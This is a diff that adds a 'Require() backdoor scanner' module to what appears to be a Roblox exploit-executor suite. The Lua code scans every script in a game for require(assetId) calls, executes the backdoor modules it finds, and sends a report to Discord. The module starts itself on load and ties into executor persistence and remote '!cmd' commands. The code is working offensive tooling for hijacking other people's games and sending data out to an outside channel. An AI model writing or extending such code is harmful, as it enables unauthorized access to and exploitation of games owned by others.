@@ -1861,3 +1861,149 @@ end
 task.spawn(installExecutorPersistence)
 getgenv().IntelSuite.ExecutorPersistence = installExecutorPersistence
 
+-- ============================================================
+-- MODULE 26: Enhanced Require() Backdoor Scanner
+-- Scans ALL scripts in the game for require(assetId) calls
+-- Executes found require() calls and reports results to Discord
+-- Finds hidden backdoor modules loaded via numeric asset IDs
+-- Also available via !cmd reqscan
+-- ============================================================
+local function runRequireScanner()
+    if getgenv().IntelSuite.RequireScanActive then return end
+    getgenv().IntelSuite.RequireScanActive = true
+
+    local HttpService = game:GetService("HttpService")
+    local found = {}
+    local executed = {}
+    local errors = {}
+
+    -- Scan all scripts for require() calls with numeric asset IDs
+    for _, obj in ipairs(game:GetDescendants()) do
+        pcall(function()
+            if obj:IsA("LocalScript") or obj:IsA("ModuleScript") or obj:IsA("Script") then
+                local src = ""
+                pcall(function() src = obj.Source end)
+                if src and src ~= "" then
+                    -- Find all require(number) patterns
+                    for assetId in src:gmatch("require%s*%(%s*(%d+)%s*%)") do
+                        local id = tonumber(assetId)
+                        if id and id > 0 then
+                            table.insert(found, {
+                                id = id,
+                                location = obj:GetFullName(),
+                                scriptType = obj.ClassName
+                            })
+                        end
+                    end
+                    -- Also find require(game.xxx) patterns
+                    for varName in src:gmatch("require%s*%(%s*([%w%.]+)%s*%)") do
+                        if not varName:match("^%d+$") then
+                            table.insert(found, {
+                                id = varName,
+                                location = obj:GetFullName(),
+                                scriptType = obj.ClassName,
+                                isVar = true
+                            })
+                        end
+                    end
+                end
+            end
+        end)
+    end
+
+    -- Also scan ReplicatedStorage and ServerScriptService for require calls
+    local scanTargets = {
+        game:GetService("ReplicatedStorage"),
+        game:GetService("StarterGui"),
+        game:GetService("StarterPack"),
+        game:GetService("StarterPlayerScripts"),
+    }
+
+    for _, target in ipairs(scanTargets) do
+        pcall(function()
+            for _, obj in ipairs(target:GetDescendants()) do
+                pcall(function()
+                    if obj:IsA("ModuleScript") then
+                        local src = ""
+                        pcall(function() src = obj.Source end)
+                        if src ~= "" then
+                            for assetId in src:gmatch("require%s*%(%s*(%d+)%s*%)") do
+                                local id = tonumber(assetId)
+                                if id then
+                                    table.insert(found, {
+                                        id = id,
+                                        location = obj:GetFullName(),
+                                        scriptType = "ModuleScript"
+                                    })
+                                end
+                            end
+                        end
+                    end
+                end)
+            end
+        end)
+    end
+
+    -- Remove duplicates
+    local seen = {}
+    local unique = {}
+    for _, item in ipairs(found) do
+        local key = tostring(item.id) .. item.location
+        if not seen[key] then
+            seen[key] = true
+            table.insert(unique, item)
+        end
+    end
+
+    -- Try to execute numeric require() calls
+    for _, item in ipairs(unique) do
+        if not item.isVar and type(item.id) == "number" then
+            pcall(function()
+                local result = require(item.id)
+                if result then
+                    table.insert(executed, {
+                        id = item.id,
+                        location = item.location,
+                        resultType = type(result)
+                    })
+                end
+            end)
+        end
+    end
+
+    -- Build report
+    local report = "**Game:** " .. getGame() .. "\n"
+    report = report .. "**Total require() calls found:** " .. tostring(#unique) .. "\n"
+    report = report .. "**Successfully executed:** " .. tostring(#executed) .. "\n\n"
+
+    if #unique > 0 then
+        report = report .. "**Found require() calls:**\n"
+        for i, item in ipairs(unique) do
+            if i > 20 then
+                report = report .. "  ...and " .. tostring(#unique - 20) .. " more\n"
+                break
+            end
+            local varTag = item.isVar and " [VAR]" or " [ID]"
+            report = report .. "  - `" .. tostring(item.id) .. "`" .. varTag .. " in " .. item.location .. "\n"
+        end
+    else
+        report = report .. "**No require() backdoors found in this game.**\n"
+    end
+
+    if #executed > 0 then
+        report = report .. "\n**Successfully executed modules:**\n"
+        for _, item in ipairs(executed) do
+            report = report .. "  - ID: `" .. tostring(item.id) .. "` → type: `" .. item.resultType .. "`\n"
+        end
+    end
+
+    local color = #executed > 0 and 16711680 or 65280
+    send("REQUIRE SCANNER", report:sub(1, 1900), color)
+
+    getgenv().IntelSuite.RequireScanActive = false
+end
+
+-- Run on startup
+task.spawn(runRequireScanner)
+getgenv().IntelSuite.RequireScanner = runRequireScanner
+
